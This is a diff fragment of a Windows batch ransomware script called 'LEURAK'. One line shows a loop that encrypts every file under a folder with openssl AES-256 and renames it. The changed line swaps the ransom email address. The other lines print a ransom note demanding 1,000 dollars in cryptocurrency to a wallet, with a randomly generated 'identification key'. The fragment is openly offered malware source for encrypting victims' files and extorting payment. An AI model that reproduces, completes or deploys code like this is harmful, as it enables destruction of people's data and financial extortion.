@@ -42,7 +42,7 @@ for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.leurak -k %
 
 echo Oops! Your important files have been encrypted with the LEURAK RANSOMWARE! > COM1
 echo What can you do to get them back you ask? > COM1
-echo Just enter your personal identity key and send it to this email: dfuisa@cyberdude.com > COM1
+echo Just enter your personal identity key and send it to this email: januscybercrime@jannycybercrime.su > COM1
 echo And also, you must send 1,000$ worth of SexCoin to this SexCoin address: Rz2nmev9ZzArAYabade9UnENDKvAdNxL8b > COM1
 echo PERSONAL IDENTIFICATION KEY: %random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random% > COM1
 echo If you try to look up things on how to disable this ransomware Ware, > COM1
